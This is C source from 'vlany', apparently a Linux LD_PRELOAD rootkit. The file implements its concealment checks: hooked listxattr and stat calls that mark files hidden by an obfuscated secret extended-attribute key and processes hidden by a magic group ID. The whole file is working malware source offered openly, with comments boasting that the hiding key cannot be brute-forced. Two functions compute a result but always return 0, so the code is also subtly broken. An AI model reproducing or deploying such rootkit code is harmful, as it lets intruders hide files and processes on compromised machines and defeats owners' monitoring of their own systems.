// These functions are incredibly important to vlany. As of June 2nd 2016, I'm switching to using extended attributes as the primary method of hiding files.
// It was a part of vlany for a long time, but never the primary way to hide files.

// The attribute used for hiding files has a key length of 32 uppercase characters. (excluding the "user." prefix)
// So, good luck bruteforcing this.
// The GID checks are still used for hiding vlany processes. The procfs doesn't support use of extended attributes, so for now, we still need to use GID
// based process hiding.

int hidden_xattr(const char *filename);
int hidden_fxattr(int fd);
int hidden_lxattr(const char *filename);

int hidden_xstat(int ver, const char *filename, int mode);
int hidden_fxstat(int ver, int fd, int mode);
int hidden_lxstat(int ver, const char *filename, int mode);

int hidden_str(const char *str);
int hiddenDirectory(const char *str);

// im feeling a little parched
int hidden_xattr(const char *filename)
{
    #ifdef DEBUG
        printf("[vlany] hidden_xattr() called\n");
        printf("[vlany] hidden_xattr() is going to attempt to distuingish visibility of %s\n", filename);
    #endif

    HOOK(old_listxattr, CLISTXATTR);

    ssize_t buflen, keylen;
    char *buf, *key;

    if((buflen = old_listxattr(filename, NULL, 0)) == -1) return 0;
    else if(buflen == 0) return 0;

    buf = malloc(buflen);
    if((buflen = old_listxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; } // fuuuck

    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);

    int ret = 0;
    key = buf;
    while(buflen > 0)
    {
        if(strstr(key, hidden_xattr_1_str)) ret = 1;
        keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
    }

    CLEAN(hidden_xattr_1_str);
    free(buf);
    return ret;
}

int hidden_fxattr(int fd)
{
    #ifdef DEBUG
        printf("[vlany] hidden_fxattr() called\n");
        printf("[vlany] hidden_fxattr() is going to attempt to distuingish visibility of file descriptor %d\n", fd);
    #endif

    HOOK(old_flistxattr, CFLISTXATTR);

    ssize_t buflen, keylen;
    char *buf, *key;

    if((buflen = old_flistxattr(fd, NULL, 0)) == -1) return 0;
    else if(buflen == 0) return 0;

    buf = malloc(buflen);
    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }

    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);

    int ret = 0;
    key = buf;
    while(buflen > 0)
    {
        if(strstr(key, hidden_xattr_1_str)) ret = 1;
        keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
    }

    CLEAN(hidden_xattr_1_str);
    free(buf);
    return 0;
}

int hidden_lxattr(const char *filename)
{
    #ifdef DEBUG
        printf("[vlany] hidden_lxattr() called\n");
        printf("[vlany] hidden_lxattr() is going to attempt to distuingish visibility of %s\n", filename);
    #endif

    HOOK(old_llistxattr, CLLISTXATTR);

    ssize_t buflen, keylen;
    char *buf, *key;

    if((buflen = old_llistxattr(filename, NULL, 0)) == -1) return 0;
    else if(buflen == 0) return 0;

    buf = malloc(buflen);
    if((buflen = old_llistxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }

    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);

    int ret = 0;
    key = buf;
    while(buflen > 0)
    {
        if(strstr(key, hidden_xattr_1_str)) ret = 1;
        keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
    }

    CLEAN(hidden_xattr_1_str);
    free(buf);
    return 0;
}

int hidden_xstat(int ver, const char *filename, int mode)
{
    #ifdef DEBUG
        printf("[vlany] hidden_xstat() called\n");
        printf("[vlany] hidden_xstat() is going to attempt to distuingish visibility of %s\n", filename);
    #endif

    char *proc_path = strdup(PROC_PATH); xor(proc_path);
    if(strncmp(filename, proc_path, strlen(proc_path))) { CLEAN(proc_path); return 0; } // readdir is just doing a general file check, bail
    CLEAN(proc_path);

    if(mode == 32)
    {
        HOOK(old_xstat, C__XSTAT);

        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        old_xstat(ver, filename, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }
    
    if(mode == 64)
    {
        HOOK(old_xstat64, C__XSTAT64);

        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        old_xstat64(ver, filename, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }

    #ifdef DEBUG
        if(mode != 32 && mode != 64) printf("[-] supplied mode for hidden_xstat((version)%d, (filename)%s, (MODE)%d) is incorrect!\n", ver, filename, mode);
    #endif

    return 0;
}

int hidden_fxstat(int ver, int fd, int mode)
{
    #ifdef DEBUG
        printf("[vlany] hidden_fxstat() called\n");
        printf("[vlany] hidden_fxstat() is going to attempt to distuingish visibility of file descriptor %d\n", fd);
    #endif

    if(mode == 32)
    {
        HOOK(old_fxstat, C__FXSTAT);

        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        old_fxstat(ver, fd, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }

    if(mode == 64)
    {
        HOOK(old_fxstat64, C__FXSTAT64);

        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        old_fxstat64(ver, fd, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }

    #ifdef DEBUG
        if(mode != 32 && mode != 64) printf("[-] supplied mode for hidden_fxstat((version)%d, (fd)%d, (MODE)%d) is incorrect!\n", ver, fd, mode);
    #endif

    return 0;
}

int hidden_lxstat(int ver, const char *filename, int mode)
{
    #ifdef DEBUG
        printf("[vlany] hidden_lxstat() called\n");
        printf("[vlany] hidden_lxstat() is going to attempt to distuingish visibility of %s\n", filename);
    #endif

    if(mode == 32)
    {
        HOOK(old_lxstat, C__LXSTAT);

        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        old_lxstat(ver, filename, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }

    if(mode == 64)
    {
        HOOK(old_lxstat64, C__LXSTAT64);

        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        old_lxstat64(ver, filename, &s_fstat);
        if(s_fstat.st_gid == MAGIC_GID) return 1;
    }

    #ifdef DEBUG
        if(mode != 32 && mode != 64) printf("[-] supplied mode for hidden_lxstat((ver)%d, (filename)%s, (MODE)%d) is incorrect!\n", ver, filename, mode);
    #endif

    return 0;
}

int hidden_str(const char *str)
{
    #ifdef DEBUG
        printf("[vlany] hidden_str() called\n");
        printf("[vlany] hidden_str() is going to attempt to distuingish visibility of string %s\n", str);
    #endif

    /*int i, ret = 0;
    for(i = 0; i < SSIZE; i++)
    {
        char *mstr = strdup(magic_strings[i]); xor(mstr);
        if(strstr(str, mstr)) ret = 1;
        CLEAN(mstr);
    }*/

    return 0;
}

int hiddenDirectory(const char *str)
{
    #ifdef DEBUG
        printf("[vlany] hiddenDirectory() called\n");
        printf("[vlany] hiddenDirectory() is going to attempt to distuingish visibility of directory %s\n", str);
    #endif

    char cwd[1024];
    if(getcwd(cwd, sizeof(cwd)) != NULL) if(strstr(cwd, str)) return 1;
    return 0;
}
